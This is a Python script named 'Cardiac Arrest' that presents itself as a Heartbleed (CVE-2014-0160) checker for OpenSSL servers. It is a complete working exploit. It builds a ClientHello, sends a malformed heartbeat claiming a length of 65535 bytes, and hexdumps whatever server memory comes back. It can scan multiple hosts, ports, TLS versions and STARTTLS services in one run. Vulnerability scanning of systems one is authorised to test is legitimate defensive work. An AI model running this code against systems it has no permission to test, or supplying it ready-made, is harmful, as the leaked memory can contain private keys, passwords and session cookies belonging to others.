#!/usr/bin/python

# Hut3 Cardiac Arrest - A script to check OpenSSL servers for the Heartbleed bug (CVE-2014-0160).
#
# DISCLAIMER: There have been unconfirmed reports that this script can render HP iLO unresponsive.
# This script complies with the TLS specification, so responsitivity issues are likely the result 
# of a bad implementation of TLS on the server side. CNS Hut3 and Adrian Hayter do not accept
# responsibility if this script crashes a server you test it against. USE IT AT YOUR OWN RISK.
# As always, the correct way to test for the vulnerability is to check the version of OpenSSL
# installed on the server in question. OpenSSL 1.0.1 through 1.0.1f are vulnerable.
#
# This script has several advantages over similar scripts that have been released,
# including a larger list of supported TLS cipher suites, support for multiple TLS
# protocol versions (including SSLv3 since some configurations leak memory when
# SSLv3 is used). Multiple ports / hosts can be tested at once, and limited
# STARTTLS support is included.
#
#
# Examples:
#
# Test all SSL/TLS protocols against 192.168.0.1 and 192.168.0.2 on ports 443 and 8443:
#
#    python cardiac-arrest.py -p 443,8443 192.168.0.1 192.168.0.2
#
# Test the TLSv1.2 protocol against 192.168.0.1 using SMTP STARTTLS on port 25:
#
#    python cardiac-arrest.py -s smtp -p 25 -V TLSv1.2 192.168.0.1
#
#
# Several sections of code have been lifted from other detection scripts and
# modified to make them more efficient. Sources include but are likely not limited to:
#
# https://bitbucket.org/johannestaas/heartattack (johannestaas@gmail.com)
# https://gist.github.com/takeshixx/10107280 (takeshix@adversec.com)
#
# Like other authors of Heartbleed scripts, I disclaim copyright to this source code.

import sys
import struct
import socket
import time
import select
import re
import argparse
import random
import string

num_bytes_per_line = 16
display_null_bytes = False
verbose = False

starttls_options = ['none', 'smtp', 'pop3', 'imap', 'ftp']
protocol_hex_to_name = {0x00:'SSLv3', 0x01:'TLSv1.0', 0x02:'TLSv1.1', 0x03:'TLSv1.2'}
protocol_name_to_hex = dict(reversed(item) for item in protocol_hex_to_name.items())

alert_levels = {0x01:'warning', 0x02:'fatal'}
alert_descriptions = {0x00:'Close notify', 0x0a:'Unexpected message', 0x14:'Bad record MAC', 0x15:'Decryption failed', 0x16:'Record overflow ', 0x1e:'Decompression failure', 0x28:'Handshake failure', 0x29:'No certificate', 0x2a:'Bad certificate', 0x2b:'Unsupported certificate', 0x2c:'Certificate revoked', 0x2d:'Certificate expired', 0x2e:'Certificate unknown', 0x2f:'Illegal parameter', 0x30:'Unknown CA', 0x31:'Access denied', 0x32:'Decode error', 0x33:'Decrypt error', 0x3c:'Export restriction', 0x46:'Protocol version', 0x47:'Insufficient security', 0x50:'Internal error', 0x5a:'User canceled', 0x64:'No renegotiation', 0x6e:'Unsupported extension', 0x6f:'Certificate unobtainable', 0x70:'Unrecognized name', 0x71:'Bad certificate status response', 0x72:'Bad certificate hash value', 0x73:'Unknown PSK identity'}

buffer_size = 1024

def rand(size=10, chars=string.letters + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def hexdump(s):
    s = str(s)
    for b in xrange(0, len(s), num_bytes_per_line):
        lin = [c for c in s[b : b + num_bytes_per_line]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        if pdat:
            if display_null_bytes:
                print '  %04x: %-48s %s' % (b, hxdat, pdat)
            elif not re.match('^\.{' + str(num_bytes_per_line) + '}$', pdat):
                print '  %04x: %-48s %s' % (b, hxdat, pdat)
    sys.stdout.flush()

def hex2bin(arr):
    return ''.join('{0:02x}'.format(x) for x in arr).decode('hex')

# TODO: Make this method cleaner and less static (i.e. generate random numbers properly, add support for SNI)
def gen_clienthello(v):
    return hex2bin([
    0x16, # Content Type (0x16 = Handshake)
    0x03, v, # Protocol Version
    0x03, 0x0c, # Record Length
    0x01, # Handshake Type (0x01 = ClientHello)
    0x00, 0x03, 0x08, # Handshake Length
    0x03, v, #Protocol Version
    0x53, 0x48, 0x73, 0xf0, 0x7c, 0xca, 0xc1, 0xd9, 0x02, 0x04, 0xf2, 0x1d, 0x2d, 0x49, 0xf5, 0x12, 0xbf, 0x40, 0x1b, 0x94, 0xd9, 0x93, 0xe4, 0xc4, 0xf4, 0xf0, 0xd0, 0x42, 0xcd, 0x44, 0xa2, 0x59, # "Random" 32 bytes
    0x00, # Session ID
    0x02, 0x96, # Cipher Suite Length
    0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x00, 0x03, 0x00, 0x04, 0x00, 0x05, 0x00, 0x06, 0x00, 0x07, 0x00, 0x08, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x0b, 0x00, 0x0c, 0x00, 0x0d, 0x00, 0x0e, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x12, 0x00, 0x13, 0x00, 0x14, 0x00, 0x15, 0x00, 0x16, 0x00, 0x17, 0x00, 0x18, 0x00, 0x19, 0x00, 0x1a, 0x00, 0x1b, 0x00, 0x1c, 0x00, 0x1d, 0x00, 0x1e, 0x00, 0x1f, 0x00, 0x20, 0x00, 0x21, 0x00, 0x22, 0x00, 0x23, 0x00, 0x24, 0x00, 0x25, 0x00, 0x26, 0x00, 0x27, 0x00, 0x28, 0x00, 0x29, 0x00, 0x2a, 0x00, 0x2b, 0x00, 0x2c, 0x00, 0x2d, 0x00, 0x2e, 0x00, 0x2f, 0x00, 0x30, 0x00, 0x31, 0x00, 0x32, 0x00, 0x33, 0x00, 0x34, 0x00, 0x35, 0x00, 0x36, 0x00, 0x37, 0x00, 0x38, 0x00, 0x39, 0x00, 0x3a, 0x00, 0x3b, 0x00, 0x3c, 0x00, 0x3d, 0x00, 0x3e, 0x00, 0x3f, 0x00, 0x40, 0x00, 0x41, 0x00, 0x42, 0x00, 0x43, 0x00, 0x44, 0x00, 0x45, 0x00, 0x46, 0x00, 0x60, 0x00, 0x61, 0x00, 0x62, 0x00, 0x63, 0x00, 0x64, 0x00, 0x65, 0x00, 0x66, 0x00, 0x67, 0x00, 0x68, 0x00, 0x69, 0x00, 0x6a, 0x00, 0x6b, 0x00, 0x6c, 0x00, 0x6d, 0x00, 0x80, 0x00, 0x81, 0x00, 0x82, 0x00, 0x83, 0x00, 0x84, 0x00, 0x85, 0x00, 0x86, 0x00, 0x87, 0x00, 0x88, 0x00, 0x89, 0x00, 0x8a, 0x00, 0x8b, 0x00, 0x8c, 0x00, 0x8d, 0x00, 0x8e, 0x00, 0x8f, 0x00, 0x90, 0x00, 0x91, 0x00, 0x92, 0x00, 0x93, 0x00, 0x94, 0x00, 0x95, 0x00, 0x96, 0x00, 0x97, 0x00, 0x98, 0x00, 0x99, 0x00, 0x9a, 0x00, 0x9b, 0x00, 0x9c, 0x00, 0x9d, 0x00, 0x9e, 0x00, 0x9f, 0x00, 0xa0, 0x00, 0xa1, 0x00, 0xa2, 0x00, 0xa3, 0x00, 0xa4, 0x00, 0xa5, 0x00, 0xa6, 0x00, 0xa7, 0x00, 0xa8, 0x00, 0xa9, 0x00, 0xaa, 0x00, 0xab, 0x00, 0xac, 0x00, 0xad, 0x00, 0xae, 0x00, 0xaf, 0x00, 0xb0, 0x00, 0xb1, 0x00, 0xb2, 0x00, 0xb3, 0x00, 0xb4, 0x00, 0xb5, 0x00, 0xb6, 0x00, 0xb7, 0x00, 0xb8, 0x00, 0xb9, 0x00, 0xba, 0x00, 0xbb, 0x00, 0xbc, 0x00, 0xbd, 0x00, 0xbe, 0x00, 0xbf, 0x00, 0xc0, 0x00, 0xc1, 0x00, 0xc2, 0x00, 0xc3, 0x00, 0xc4, 0x00, 0xc5, 0x00, 0xff, 0xc0, 0x01, 0xc0, 0x02, 0xc0, 0x03, 0xc0, 0x04, 0xc0, 0x05, 0xc0, 0x06, 0xc0, 0x07, 0xc0, 0x08, 0xc0, 0x09, 0xc0, 0x0a, 0xc0, 0x0b, 0xc0, 0x0c, 0xc0, 0x0d, 0xc0, 0x0e, 0xc0, 0x0f, 0xc0, 0x10, 0xc0, 0x11, 0xc0, 0x12, 0xc0, 0x13, 0xc0, 0x14, 0xc0, 0x15, 0xc0, 0x16, 0xc0, 0x17, 0xc0, 0x18, 0xc0, 0x19, 0xc0, 0x1a, 0xc0, 0x1b, 0xc0, 0x1c, 0xc0, 0x1d, 0xc0, 0x1e, 0xc0, 0x1f, 0xc0, 0x20, 0xc0, 0x21, 0xc0, 0x22, 0xc0, 0x23, 0xc0, 0x24, 0xc0, 0x25, 0xc0, 0x26, 0xc0, 0x27, 0xc0, 0x28, 0xc0, 0x29, 0xc0, 0x2a, 0xc0, 0x2b, 0xc0, 0x2c, 0xc0, 0x2d, 0xc0, 0x2e, 0xc0, 0x2f, 0xc0, 0x30, 0xc0, 0x31, 0xc0, 0x32, 0xc0, 0x33, 0xc0, 0x34, 0xc0, 0x35, 0xc0, 0x36, 0xc0, 0x37, 0xc0, 0x38, 0xc0, 0x39, 0xc0, 0x3a, 0xc0, 0x3b, 0xc0, 0x3c, 0xc0, 0x3d, 0xc0, 0x3e, 0xc0, 0x3f, 0xc0, 0x40, 0xc0, 0x41, 0xc0, 0x42, 0xc0, 0x43, 0xc0, 0x44, 0xc0, 0x45, 0xc0, 0x46, 0xc0, 0x47, 0xc0, 0x48, 0xc0, 0x49, 0xc0, 0x4a, 0xc0, 0x4b, 0xc0, 0x4c, 0xc0, 0x4d, 0xc0, 0x4e, 0xc0, 0x4f, 0xc0, 0x50, 0xc0, 0x51, 0xc0, 0x52, 0xc0, 0x53, 0xc0, 0x54, 0xc0, 0x55, 0xc0, 0x56, 0xc0, 0x57, 0xc0, 0x58, 0xc0, 0x59, 0xc0, 0x5a, 0xc0, 0x5b, 0xc0, 0x5c, 0xc0, 0x5d, 0xc0, 0x5e, 0xc0, 0x5f, 0xc0, 0x60, 0xc0, 0x61, 0xc0, 0x62, 0xc0, 0x63, 0xc0, 0x64, 0xc0, 0x65, 0xc0, 0x66, 0xc0, 0x67, 0xc0, 0x68, 0xc0, 0x69, 0xc0, 0x6a, 0xc0, 0x6b, 0xc0, 0x6c, 0xc0, 0x6d, 0xc0, 0x6e, 0xc0, 0x6f, 0xc0, 0x70, 0xc0, 0x71, 0xc0, 0x72, 0xc0, 0x73, 0xc0, 0x74, 0xc0, 0x75, 0xc0, 0x76, 0xc0, 0x77, 0xc0, 0x78, 0xc0, 0x79, 0xc0, 0x7a, 0xc0, 0x7b, 0xc0, 0x7c, 0xc0, 0x7d, 0xc0, 0x7e, 0xc0, 0x7f, 0xc0, 0x80, 0xc0, 0x81, 0xc0, 0x82, 0xc0, 0x83, 0xc0, 0x84, 0xc0, 0x85, 0xc0, 0x86, 0xc0, 0x87, 0xc0, 0x88, 0xc0, 0x89, 0xc0, 0x8a, 0xc0, 0x8b, 0xc0, 0x8c, 0xc0, 0x8d, 0xc0, 0x8e, 0xc0, 0x8f, 0xc0, 0x90, 0xc0, 0x91, 0xc0, 0x92, 0xc0, 0x93, 0xc0, 0x94, 0xc0, 0x95, 0xc0, 0x96, 0xc0, 0x97, 0xc0, 0x98, 0xc0, 0x99, 0xc0, 0x9a, 0xc0, 0x9b, 0xc0, 0x9c, 0xc0, 0x9d, 0xc0, 0x9e, 0xc0, 0x9f, 0xc0, 0xa0, 0xc0, 0xa1, 0xc0, 0xa2, 0xc0, 0xa3, 0xc0, 0xa4, 0xc0, 0xa5, 0xc0, 0xa6, 0xc0, 0xa7, 0xc0, 0xa8, 0xc0, 0xa9, 0xc0, 0xaa, 0xc0, 0xab, 0xc0, 0xac, 0xc0, 0xad, 0xc0, 0xae, 0xc0, 0xaf, # Cipher Suites
    0x01, # Compression Method Length
    0x00, # Compression Method (0x00 = CompressionMethod.null)
    0x00, 0x49, # Extensions Length
    0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c, 0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07, 0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02, 0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11, 0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01, 0x01 # Extensions
    ])

def gen_heartbeat(v):
    return hex2bin([0x18, 0x03, v, 0x00, 0x03, 0x01, 0xff, 0xff])

def recvall(s, length, timeout=5):
    end = time.time() + timeout
    rdata = ''
    while length > 0:
        ready = select.select([s], [], [], 1)
        if ready[0]:
            data = s.recv(length)
            if not data:
                break
            leng = len(data)
            rdata += data
            if time.time() > end:
                break
            length -= leng
        else:
            if time.time() > end:
                break
    return rdata

def recvmsg(s, timeout=5):
    hdr = recvall(s, 5, timeout)
    if hdr is None:
        return None, None, None
    elif len(hdr) == 5:
        type, version, length = struct.unpack('>BHH', hdr)
        payload = recvall(s, length, timeout)
        if payload is None:
            return type, version, None
    else:
        return None, None, None
    return type, version, payload

def attack(ip, port, tlsversion, starttls='none', timeout=5):
    tlslongver = protocol_hex_to_name[tlsversion]
    
    if starttls == 'none':
        print '[INFO] Connecting to ' + str(ip) + ':' + str(port) + ' using ' + tlslongver
    else:
        print '[INFO] Connecting to ' + str(ip) + ':' + str(port) + ' using ' + tlslongver + ' with STARTTLS'
    sys.stdout.flush()
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    
    try:
        s.connect((ip, port))
        if starttls == 'smtp':
            recvall(s, buffer_size)
            s.send('ehlo ' + rand(10) + '\n')
            res = recvall(s, buffer_size)
            if not 'STARTTLS' in res:
                print >> sys.stderr, '\033[93m[ERROR] STARTTLS does not appear to be supported.\033[0m\n'
                sys.stderr.flush()
                return False
            s.send('starttls\n')
            recvall(s, buffer_size)
        elif starttls == 'pop3':
            recvall(s, buffer_size)
            s.send("STLS\n")
            recvall(s, buffer_size)
        elif starttls == 'imap':
            recvall(s, buffer_size)
            s.send("STARTTLS\n")
            recvall(s, buffer_size)
        elif starttls == 'ftp':
            recvall(s, buffer_size)
            s.send("AUTH TLS\n")
            recvall(s, buffer_size)
        
        if verbose: print '[INFO] Sending ClientHello'
        

        s.send(gen_clienthello(tlsversion))
        
        while True:
            type, version, payload = recvmsg(s, timeout)
            if type is None:
                print >> sys.stderr, '\033[93m[ERROR] The server closed the connection without sending the ServerHello. This might mean the server does not support ' + tlslongver + ' or it might not support SSL/TLS at all.\033[0m\n'
                sys.stderr.flush()
                return False
            elif type == 22 and ord(payload[-4]) == 0x0E:
                if verbose: print '[INFO] ServerHello received'
                break
        
        if verbose: print '[INFO] Sending Heartbeat'
        s.send(gen_heartbeat(tlsversion))
        
        while True:
            type, version, payload = recvmsg(s, timeout)
            if type is None:
                print '[INFO] No heartbeat response was received. The server is probably not vulnerable.'
                if verbose: print '[INFO] Closing connection'
                s.close()
                print ''
                sys.stdout.flush()
                return False
            
            if type == 24:
                if len(payload) > 3:
                    print '\033[91m\033[1m[FAIL] Heartbeat response was ' + str(len(payload)) + ' bytes instead of 3! ' + str(ip) + ':' + str(port) + ' is vulnerable over, find  vulnerability ' + tlslongver + '\033[0m'
                    if display_null_bytes:
                        print '[INFO] Displaying response:'
                    else:
                        print '[INFO] Displaying response (lines consisting entirely of null bytes are removed):'
                    print ''
                    hexdump(payload)
                    print ''
                    if verbose: print '[INFO] Closing connection\n'
                    sys.stdout.flush()
                    s.close()
                    return True
                else:
                    print '[INFO] The server processed the malformed heartbeat, but did not return any extra data.\n'
                    sys.stdout.flush()
                    return False
            
            if type == 21:
                print '[INFO] The server received an alert. It is likely not vulnerable.'
                if verbose: print '[INFO] Alert Level: ' + alert_levels[ord(payload[0])]
                if verbose: print '[INFO] Alert Description: ' + alert_descriptions[ord(payload[1])] + ' (see RFC 5246 section 7.2)'
                if verbose: print '[INFO] Closing connection'
                s.close()
                print ''
                sys.stdout.flush()
                return False
    
    except socket.error as e:
        print >> sys.stderr, '\033[93m[ERROR] Connection error. The port might not be open on the host.\033[0m\n'
        sys.stderr.flush()
        return False

def main():
    global bytes, display_null_bytes, verbose
    
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--ports', type=str, default='443', help='Comma separated list of ports to check (default: 443)')
    parser.add_argument('-s', '--starttls', type=str, default='none', help='Use STARTTLS to upgrade the plaintext connection to SSL/TLS. Valid values: none, smtp, pop3, imap, ftp (default: none)')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Connection timeout in seconds (default: 5)')
    parser.add_argument('-b', '--bytes', type=int, default=16, help='Number of leaked bytes to display per line (default 16)')
    parser.add_argument('-n', '--null-bytes', action='store_true', default=False, help='Display lines consisting entirely of null bytes (default: False)')
    parser.add_argument('-a', '--all-versions', action='store_true', default=False, help='Continue testing all versions of SSL/TLS even if the server is found to be vulnerable (default: False)')
    parser.add_argument('-V', '--version', type=str, default='all', help='Comma separated list of SSL/TLS versions to check. Valid values: SSLv3, TLSv1.0, TLSv1.1, TLSv1.2')
    parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Verbose output.')
    parser.add_argument('hosts', metavar='host', nargs='+', help='A host to scan.')
    args = parser.parse_args()
    
    args.starttls = args.starttls.lower()
    if args.starttls not in starttls_options:
        print >> sys.stderr, '\033[93m[ERROR] Invalid STARTTLS value. Valid values: none, smtp, pop3, imap, ftp.\033[0m\n'
        parser.print_help()
        sys.exit(1)
    
    bytes = args.bytes
    display_null_bytes = args.null_bytes
    verbose = args.verbose
    
    versions = []
    for v in [x.strip() for x in args.version.split(',')]:
        if v:
            versions.append(v)
    
    if 'all' not in versions:
        for v in versions:
            if v not in protocol_name_to_hex:
                print >> sys.stderr, '\033[93m[ERROR] Invalid SSL/TLS version(s). Valid values: SSLv3, TLSv1.0, TLSv1.1, TLSv1.2.\033[0m\n'
                parser.print_help()
                sys.exit(1)
    
    ports = args.ports.split(',')
    ports = list(map(int, ports))
    
    hosts = []
    
    for h in args.hosts:
        for h2 in h.split(','):
            h2 = h2.strip()
            if h2:
                hosts.append(h2)
    
    for host in hosts:
        try:
            ip = socket.gethostbyname(host)
        except socket.gaierror as e:
            print '[INFO] Testing: ' + host
            print >> sys.stderr, '\033[93m[ERROR] Could not resolve an IP address for the given host.\033[0m\n'
            sys.stderr.flush()
            continue
        
        if ip == host:
            print '[INFO] Testing: ' + host + '\n'
        else:
            print '[INFO] Testing: ' + host + ' (' + str(ip) + ')\n'
        sys.stdout.flush()
        
        for port in ports:
            if 'all' in versions:
                if (args.all_versions):
                    ssl30 = attack(ip, port, 0x00, starttls=args.starttls, timeout=args.timeout)
                    tls10 = attack(ip, port, 0x01, starttls=args.starttls, timeout=args.timeout)
                    tls11 = attack(ip, port, 0x02, starttls=args.starttls, timeout=args.timeout)
                    tls12 = attack(ip, port, 0x03, starttls=args.starttls, timeout=args.timeout)
                    
                    if not ssl30 and not tls10 and not tls11 and not tls12:
                        if ip == host:
                            print '\033[1m[PASS] ' + host + ':' + str(port) + ' does not appear to be vulnerable to Heartbleed!\033[0m\n'
                        else:
                            print '\033[1m[PASS] ' + host + ':' + str(port) + ' (' + str(ip) + ':' + str(port) +') does not appear to be vulnerable to Heartbleed!\033[0m\n'
                        sys.stdout.flush()
                else:
                    if not attack(ip, port, 0x00, starttls=args.starttls, timeout=args.timeout):
                        if not attack(ip, port, 0x01, starttls=args.starttls, timeout=args.timeout):
                            if not attack(ip, port, 0x02, starttls=args.starttls, timeout=args.timeout):
                                if not attack(ip, port, 0x03, starttls=args.starttls, timeout=args.timeout):
                                    if ip == host:
                                        print '\033[1m[PASS] ' + host + ':' + str(port) + ' does not appear to be vulnerable to Heartbleed!\033[0m\n'
                                    else:
                                        print '\033[1m[PASS] ' + host + ':' + str(port) + ' (' + str(ip) + ':' + str(port) + ') does not appear to be vulnerable to Heartbleed!\033[0m\n'
                                    sys.stdout.flush()
            else:
                if (args.all_versions):
                    vulnerable = []
                    for v in versions:
                        if attack(ip, port, protocol_name_to_hex[v], starttls=args.starttls, timeout=args.timeout):
                            vulnerable.append(True)
                    if True not in vulnerable:
                        if ip == host:
                            print '\033[1m[PASS] ' + host + ':' + str(port) + ' does not appear to be vulnerable to Heartbleed!\033[0m\n'
                        else:
                            print '\033[1m[PASS] ' + host + ':' + str(port) + ' (' + str(ip) + ':' + str(port) + ') does not appear to be vulnerable to Heartbleed!\033[0m\n'
                        sys.stdout.flush()
                else:
                    vulnerable = True
                    for v in versions:
                        vulnerable = attack(ip, port, protocol_name_to_hex[v], starttls=args.starttls, timeout=args.timeout)
                        if vulnerable:
                            break
                        else:
                            continue
                    if not vulnerable:
                        if ip == host:
                            print '\033[1m[PASS] ' + host + ':' + str(port) + ' does not appear to be vulnerable to Heartbleed!\033[0m\n'
                        else:
                            print '\033[1m[PASS] ' + host + ':' + str(port) + ' (' + str(ip) + ':' + str(port) + ') does not appear to be vulnerable to Heartbleed!\033[0m\n'
                        sys.stdout.flush()

if __name__ == '__main__':
    main()
